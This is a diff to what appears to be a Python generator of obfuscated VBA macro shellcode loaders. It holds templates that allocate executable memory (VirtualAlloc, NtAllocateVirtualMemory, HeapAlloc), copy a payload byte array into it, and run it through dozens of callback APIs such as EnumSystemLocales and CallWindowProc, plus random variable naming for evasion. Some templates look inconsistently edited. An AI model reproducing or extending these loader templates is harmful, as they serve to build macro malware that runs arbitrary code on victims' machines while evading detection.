@@ -30,15 +30,25 @@ namedVars = {
         'zl': ''
         }
 
-usedVarNames = []
-allowedChars = string.ascii_letters + string.numbers
+flags = {
+        'mh': False,
+        'ol': False,
+        'ph': False,
+        'rl': False,
+        'th': False,
+        'wh': False,
+        'zl': False
+        }
 
+usedVarNames = []
+allowedChars = string.ascii_letters + string.digits
 
 # Generate Random Variable Name
-def randVarName(str_size, allowed_chars):
+def randVarName(int_min, int_max, allowed_chars):
     while (True):
-        randName = ''.join(random.choice(allowed_chars) for x in range(str_size))
+        randName = ''.join(random.choice(allowed_chars) for x in range(random.randint(int_min, int_max)))
         if (randName not in usedVarNames):
+            usedVarNames.append(randName)
             return randName
         
 # Return count of numbered function arguments
@@ -58,8 +68,8 @@ memAlloc = {
                 },
             'functions': [
                 { 
-                    'declaration': 'Private Declare Function $allocateMemory Lib "kernel32" Alias "VirtualAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long, ByVal {3} As Long) As Long\n',
-                    'call': '$memoryAddress = $allocateMemory($zl, &H5000, &H1000, &H40)\n'
+                    'declaration': 'Private Declare Function ${{allocateMemory}} Lib "kernel32" Alias "VirtualAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long, ByVal {3} As Long) As Long\n',
+                    'call': '${{memoryAddress}} = ${{allocateMemory}}(${{zl}}, &H5000, &H1000, &H40)\n'
                     }
                 ]
             },
@@ -70,8 +80,8 @@ memAlloc = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $allocateMemory Lib "ntdll" Alias "NtAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
-                    'call': '$memoryAddress = $allocateMemory(ByVal -1, $rL, $zL, &H5000, &H1000, &H40)\n $memoryAddress = $rL\n'
+                    'declaration': 'Private Declare Function ${{allocateMemory}} Lib "ntdll" Alias "NtAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
+                    'call': '${{memoryAddress}} = ${{allocateMemory}}(ByVal -1, ${{rl}}, ${{zl}}, &H5000, &H1000, &H40)\n ${{memoryAddress}} = ${{rl}}\n'
                     }
                 ]
             },
@@ -82,8 +92,8 @@ memAlloc = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $allocateMemory Lib "ntdll" Alias "ZwAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
-                    'call': '$memoryAddress = $allocateMemory(ByVal -1, $rl, $zL, &H5000, &H1000, &H40)\n $memoryAddress = $rL\n',
+                    'declaration': 'Private Declare Function ${{allocateMemory}} Lib "ntdll" Alias "ZwAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
+                    'call': '${{memoryAddress}} = ${{allocateMemory}}(ByVal -1, ${{rl}}, ${{zl}}, &H5000, &H1000, &H40)\n ${{memoryAddress}} = ${{rl}}\n',
                     }
                 ]
             },
@@ -94,12 +104,12 @@ memAlloc = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $createMemory Lib "kernel32" Alias "HeapCreate" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
-                    'call': '$rL = $createMemory(&H40000, $zL, $zL)\n',
+                    'declaration': 'Private Declare Function ${createMemory} Lib "kernel32" Alias "HeapCreate" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
+                    'call': '${{rl}} = ${createMemory}(&H40000, ${{zl}}, ${{zl}})\n',
                     },
                 {
-                    'declaration': 'Private Declare Function $allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
-                    'call': '$memoryAddress = $allocateMemory($rL, $zL, &H5000)\n',
+                    'declaration': 'Private Declare Function ${{allocateMemory}} Lib "kernel32" Alias "HeapAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
+                    'call': '${{memoryAddress}} = ${{allocateMemory}}(${{rl}}, ${{zl}}, &H5000)\n',
                     }
                     
                 ]
@@ -113,19 +123,19 @@ memWrite = {
             'globalFlags': {},
             'functions': [
                 {
-                    'declaration': 'Private Declare Sub $copyMemory Lib "ntdll" Alias "RtlMoveMemory" ({0} As Any, {1} As Any, ByVal {2} As Long)\n',
-                    'call': '$copyMemory ByVal $memoryAddress, $byteArray(0), UBound($byteArray) + 1\n',
+                    'declaration': 'Private Declare Sub ${{copyMemory}} Lib "ntdll" Alias "RtlMoveMemory" ({0} As Any, {1} As Any, ByVal {2} As Long)\n',
+                    'call': '${{copyMemory}} ByVal ${{memoryAddress}}, ${{byteArray}}(0), UBound(${{byteArray}}) + 1\n',
                     }
                 ]
             },
         'WriteProcessMemory': {
-            'globalVars': {
+            'globalFlags': {
                 'zl': True
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $copyMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal {0} As Long, ByVal {1} As Any, ByVal {2} As Long, ByVal {3} As Long, ByVal {4} As Long) As Long\n',
-                    'call': '$copyMemory ByVal -1, $memoryAddress, VarPtr($byteArray(0)), UBound($byteArray) + 1, $zL\n',
+                    'declaration': 'Private Declare Function ${{copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal {0} As Long, ByVal {1} As Any, ByVal {2} As Long, ByVal {3} As Long, ByVal {4} As Long) As Long\n',
+                    'call': '${{copyMemory}} ByVal -1, ${{memoryAddress}}, VarPtr(${{byteArray}}(0)), UBound(${{byteArray}}) + 1, ${{zl}}\n',
                     }
                 ]
             }
@@ -139,8 +149,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "CallWindowProcA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "CallWindowProcA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -150,8 +160,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "CallWindowProcW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "CallWindowProcW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -163,8 +173,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "DialogBoxIndirectParamA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($moduleHandle, $moduleHandle, $windowHandle, $memoryAddress, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "DialogBoxIndirectParamA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{moduleHandle}}, ${{moduleHandle}}, ${{windowHandle}}, ${{memoryAddress}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -176,8 +186,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "DialogBoxIndirectParamW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($moduleHandle, $moduleHandle, $windowHandle, $memoryAddress, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "DialogBoxIndirectParamW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{moduleHandle}}, ${{moduleHandle}}, ${{windowHandle}}, ${{memoryAddress}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -188,8 +198,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumCalendarInfoA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$rL = 3072\n $executeResult = $shellExecute($memoryAddress, $rL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumCalendarInfoA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{rl}} = 3072\n ${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{rl}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -201,7 +211,7 @@ exeShell = {
             'functions': [
                 {
                     'declaration': 'private declare function $shellexecute lib "kernel32" alias "enumcalendarinfow" (byval {0} as any, byval {1} as any, byval {2} as any, byval {3} as any) as long\n',
-                    'call': 'rL = 3072\n$executeResult = $shellExecute($memoryAddress, $rL, $oL, $oL)\n'
+                    'call': 'rL = 3072\n${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{rl}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -211,8 +221,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumDateFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumDateFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -222,8 +232,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumDateFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumDateFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -233,8 +243,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumDesktopWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -244,8 +254,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumDesktopsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -255,8 +265,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumDesktopsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -267,8 +277,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumLanguageGroupLocalesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{ol}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -279,8 +289,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumLanguageGroupLocalesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{ol}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -290,8 +300,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumPropsExA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($windowHandle, $memoryAddress)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumPropsExA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{windowHandle}}, ${{memoryAddress}})\n'
                     }
                 ]
             },
@@ -301,8 +311,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumPropsExW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($windowHandle, $memoryAddress)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumPropsExW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{windowHandle}}, ${{memoryAddress}})\n'
                     }
                 ]
             },
@@ -312,8 +322,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "powrprof" Alias "EnumPwrSchemes" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "powrprof" Alias "EnumPwrSchemes" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -323,8 +333,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumResourceTypesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -334,8 +344,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumResourceTypesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -345,8 +355,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumResourceTypesExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -356,8 +366,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumResourceTypesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -367,8 +377,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemCodePagesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -378,8 +388,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -389,8 +399,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemLanguageGroupsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -400,8 +410,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemLanguageGroupsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -411,8 +421,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -422,8 +432,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLocalesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumSystemLocalesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -433,8 +443,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumThreadWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumThreadWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -444,8 +454,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumTimeFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumTimeFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -455,8 +465,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumTimeFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumTimeFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -466,8 +476,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumUILanguagesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumUILanguagesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -477,8 +487,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumUILanguagesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "kernel32" Alias "EnumUILanguagesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -488,8 +498,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindowStationsA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumWindowStationsA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -499,8 +509,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindowStationsW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumWindowStationsW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -510,8 +520,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindows" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "EnumWindows" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -522,8 +532,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModules" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "dbghelp" Alias "EnumerateLoadedModules" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{processHandle}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -534,8 +544,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesEx" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "dbghelp" Alias "EnumerateLoadedModulesEx" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{processHandle}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -546,8 +556,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
